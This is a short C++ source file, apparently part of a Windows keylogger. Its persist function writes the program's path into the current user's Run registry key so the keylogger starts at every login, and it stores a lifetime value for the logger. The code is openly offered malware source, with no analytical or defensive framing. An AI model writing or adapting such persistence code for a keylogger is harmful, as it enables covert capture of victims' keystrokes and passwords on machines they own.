//main keylogger file

//imports 
#include "keylogger.h"
#include "tableCSS.h"

using namespace std;

KeyLogger* KeyLogger::instance = NULL;

void KeyLogger::persist(std::string path) {
    
    if (path.empty()) {
        path = programPath;
    }

    HKEY key;
    RegCreateKey(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        &key
    );

    std::string keyValue = "\"";

    keyValue += path;

    keyValue += "\"";
    
    //launch at startup
    RegSetValueEx(key, REGKEY_PERSIST, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
    
    //set life time
    RegSetValueEx(key, REGKEY_LIFETIME, 0, REG_SZ, (BYTE*)KEYLOGGER_LIFETIME, sizeof(KEYLOGGER_LIFETIME));
}

